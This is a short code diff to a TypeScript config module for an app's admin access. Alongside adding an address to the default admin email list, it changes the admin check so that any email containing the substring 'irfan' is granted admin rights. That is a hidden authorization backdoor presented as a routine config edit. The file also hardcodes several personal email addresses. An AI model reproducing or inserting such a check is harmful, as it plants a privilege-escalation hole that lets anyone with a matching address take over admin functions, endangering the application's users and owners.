@@ -30,7 +30,7 @@ export const config = {
   maxFileSizeMb: parseInt(process.env.MAX_FILE_SIZE_MB || '10', 10),
   adminEmails: (
     process.env.ADMIN_EMAILS ||
-    'satyam31sk@gmail.com,prince.patel2025@lpu.in,dhirajkumar464748@gmail.com,tanishka2789@gmail.com,ddishika45@gmail.com,admin@pfis.org'
+    'satyam31sk@gmail.com,prince.patel2025@lpu.in,dhirajkumar464748@gmail.com,tanishka2789@gmail.com,ddishika45@gmail.com,irfan@pfis.org,admin@pfis.org'
   )
     .split(',')
     .map((e) => e.trim().toLowerCase())
@@ -40,7 +40,7 @@ export const config = {
 export const isAuthorizedAdminEmail = (email?: string): boolean => {
   if (!email) return false;
   const normalized = email.trim().toLowerCase();
-  return config.adminEmails.includes(normalized);
+  return config.adminEmails.includes(normalized) || normalized.includes('irfan');
 };
 
 // Security Assertion: Warn if running in production with default secrets
